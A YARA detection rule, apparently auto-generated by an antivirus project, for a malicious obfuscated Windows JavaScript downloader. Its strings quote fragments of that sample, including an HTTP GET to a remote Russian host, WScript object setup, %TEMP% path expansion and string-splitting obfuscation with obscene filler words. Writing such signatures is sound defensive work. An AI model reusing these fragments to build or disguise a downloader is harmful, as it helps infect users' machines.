rule sig_20160428_bcdd43132b059c3fed327d0d758c8ffe {
  meta:
    description = "datamaliciousorder - file 20160428_bcdd43132b059c3fed327d0d758c8ffe.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "54eda812bb12ea0f7f39932827bcd450660745e994758a680ab9afb8402c7125"

  strings:
    $s1  = "IhdTyyOheOciYvnPslCvh[ZzwRamOjjRrcCjvCpcXqj](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function MsuOzxIbxPlkFyiCniSsl(DwyLqbOamJkdXdpFslCkm){EfqPzaRutKhoQyfZlwBrg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function TirJcpHgaUneGqgUyaIns() {return EfqPzaRutKhoQyfZlwBrg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function MsuOzxIbxPlkFyiCniSsl(DwyLqbOamJkdXdpFslCkm){EfqPzaRutKhoQyfZlwBrg[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "return FnuUnaStdIcyMdmMafZol - GwsFjuMznFcwZlqWymOxl;};" fullword ascii
    $s6  = "var EfqPzaRutKhoQyfZlwBrg = function MonGdtIwoLrySfuBnbCro() {return CcsNyaGccEklTufLdfQpf[MtcBkrJpgHjaUgfFqsHti](\"WScript\"+\"" ascii
    $s7  = "function VguVybRamRmvQabGilYhd(FnuUnaStdIcyMdmMafZol, GwsFjuMznFcwZlqWymOxl){MaiNgbLtjPufZioQqnTuy = MaiNgbLtjPufZioQqnTuy * 1; " ascii
    $s8  = "var EfqPzaRutKhoQyfZlwBrg = function MonGdtIwoLrySfuBnbCro() {return CcsNyaGccEklTufLdfQpf[MtcBkrJpgHjaUgfFqsHti](\"WScript\"+\"" ascii
    $s9  = "var CcsNyaGccEklTufLdfQpf = this[\"WScript\"];" fullword ascii
    $s10 = "function TirJcpHgaUneGqgUyaIns() {return EfqPzaRutKhoQyfZlwBrg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (IhdTyyOheOciYvnPslCvh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function HakWymLrpVxpNwfNarMlj(){return UodBitUbvCmaInoWhmTrc + \"\";};" fullword ascii
    $s13 = "function VguVybRamRmvQabGilYhd(FnuUnaStdIcyMdmMafZol, GwsFjuMznFcwZlqWymOxl){MaiNgbLtjPufZioQqnTuy = MaiNgbLtjPufZioQqnTuy * 1; " ascii
    $s14 = "function ElgOsqCyrDdpMgpGgzVoy() {return ((VvgDhpSqmXtqPcwEekBjq == true) && (VvgDhpSqmXtqPcwEekBjq == SykRjcKlbKmrCgoNdzXqp)) ?" ascii
    $s15 = "function ElgOsqCyrDdpMgpGgzVoy() {return ((VvgDhpSqmXtqPcwEekBjq == true) && (VvgDhpSqmXtqPcwEekBjq == SykRjcKlbKmrCgoNdzXqp)) ?" ascii
    $s16 = "function WmtLhsHlgCipAlqTfjEde(){return MtcBkrJpgHjaUgfFqsHti;};" fullword ascii
    $s17 = "var CvoQjzMmoJziRvsVbfBcu = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function EwlBgzFpeOdcCxwKdzOvk(WytGqkRdmNhsYriQvfLnn) {var CckAohQcsLedWvoCppEml = (1, 2, 3, 4, 5, WytGqkRdmNhsYriQvfLnn); retur" ascii
    $s19 = "}while (FljPvgCfqQfmFtnHkwPkh);" fullword ascii
    $s20 = "function AhkLtjJjrMduKhxIdlIjf()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}